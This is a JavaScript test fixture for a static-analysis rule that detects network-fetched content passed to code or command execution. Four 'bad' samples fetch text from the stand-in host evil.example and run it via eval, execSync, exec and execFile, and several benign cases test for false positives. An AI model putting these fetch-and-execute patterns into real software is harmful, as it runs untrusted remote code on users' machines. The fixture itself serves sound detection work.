// opengrep --test fixtures for js_net_to_exec.
// Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.

const cp = require("child_process");
const https = require("https");

async function bad1() {
  const res = await fetch("https://evil.example/payload");
  const body = await res.text();
  // ruleid: js_net_to_exec
  eval(body);
}

function bad2() {
  https.get("https://evil.example/cmd", (r) => {
    let data = "";
    r.on("data", (c) => (data += c));
    r.on("end", () => {
      // ruleid: js_net_to_exec
      cp.execSync(data);
    });
  });
}

// real child_process.exec on a fetched body MUST still fire.
async function bad3() {
  const res = await fetch("https://evil.example/cmd");
  const cmd = await res.text();
  // ruleid: js_net_to_exec
  cp.exec(cmd);
}

// execFile on a fetched payload MUST fire.
function bad4() {
  https.get("https://evil.example/bin", (r) => {
    let data = "";
    r.on("data", (c) => (data += c));
    r.on("end", () => {
      // ruleid: js_net_to_exec
      cp.execFile(data);
    });
  });
}

function ok1() {
  // ok: js_net_to_exec
  cp.execSync("node-gyp rebuild");
}

async function ok2() {
  const res = await fetch("https://registry.example/meta.json");
  // ok: js_net_to_exec
  console.log(await res.json());
}

// FP guard: RegExp.prototype.exec on a fetched HTML body is string matching,
// not command execution (the arise-jinwoo-cli / opencode-fork web-search HTML
// parser false positive — `resultRegex.exec(html)` must NOT match `$CP.exec`).
async function ok3() {
  const res = await fetch("https://html.duckduckgo.com/html/?q=x");
  const html = await res.text();
  const resultRegex = /<a[^>]+href="([^"]*)"/gi;
  let m;
  // ok: js_net_to_exec
  while ((m = resultRegex.exec(html)) !== null) {
    console.log(m[1]);
  }
}
